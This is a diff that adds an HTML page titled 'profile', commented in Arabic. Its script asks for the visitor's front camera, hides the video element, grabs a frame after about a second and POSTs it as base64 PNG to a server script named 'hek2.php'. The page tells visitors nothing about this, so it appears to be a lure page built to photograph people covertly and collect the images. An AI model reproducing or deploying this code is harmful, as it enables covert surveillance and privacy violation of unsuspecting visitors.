@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>profile</title>
+</head>  
+<body>
+<video style="#display:none;" autoplay></video>
+
+  <script>
+    var video = document.querySelector('video');
+    var counter = 0;
+    var maxImages = 1;
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+      .then(function(stream) {
+        video.srcObject = stream;
+        // التقاط الصورة تلقائيا كل 5 ثواني
+      var intervalId=  setInterval(function() {
+          if (counter < maxImages) {
+            captureImage();
+            counter++;
+          } else {
+            clearInterval(intervalId); // توقف عند الوصول للحد المسموح
+          }
+        }, 1000);
+      })
+      .catch(function(error) {
+        console.log('حدث خطأ: ', error);
+      });
+
+    function captureImage() {
+      var canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      var imageData = canvas.toDataURL('image/png');
+      
+    const dataToSend= [{"key":imageData}];
+
+// خيارات الطلب
+const requestOptions = {
+    method: 'POST', // يمكن أن تكون GET أو POST أو أي طريقة أخرى تتطلبها الAPI
+    headers: {
+        'Content-Type': 'application/json' // نوع المحتوى الذي ترسله إلى الAPI
+        // يمكنك أيضًا إضافة المزيد من الرؤوس إذا لزم الأمر، مثل رأس التوثيق
+    },
+    body: JSON.stringify(dataToSend) // تحويل البيانات إلى سلسلة JSON
+};
+
+// إرسال الطلب إلى الAPI باستخدام fetch
+fetch('hek2.php', requestOptions)
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return response.json(); // قراءة البيانات المردة من الAPI ك JSON
+    })
+    .then(data => {
+        document.write('API response:', data.msg);
+        // يمكنك استخدام البيانات المردة هنا
+    })
+    .catch(error => {
+          document.write('There was a problem with the fetch operation:', error);
+    });
+  }
+  </script>
+  
+  
+</body>
+</html>
